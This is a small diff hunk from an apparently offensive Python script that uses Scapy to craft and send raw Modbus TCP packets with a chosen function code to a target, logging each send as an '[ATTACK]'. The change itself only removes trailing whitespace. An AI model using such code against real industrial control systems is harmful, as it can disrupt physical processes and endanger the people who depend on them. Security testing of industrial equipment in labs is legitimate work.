@@ -20,7 +20,7 @@ def send_modbus_packet(target, function_code, unit_id=1, payload=b"\x00\x01\x00\
     # Followed by Function Code (1) and Payload
     mbap = b"\x00\x01\x00\x00\x00\x06" + bytes([unit_id])
     modbus_data = bytes([function_code]) + payload
-    
+
     packet = IP(dst=target)/TCP(dport=MODBUS_PORT)/Raw(load=mbap + modbus_data)
     send(packet, verbose=False)
     print(f"[ATTACK] Sent Modbus FC {function_code} to {target}")
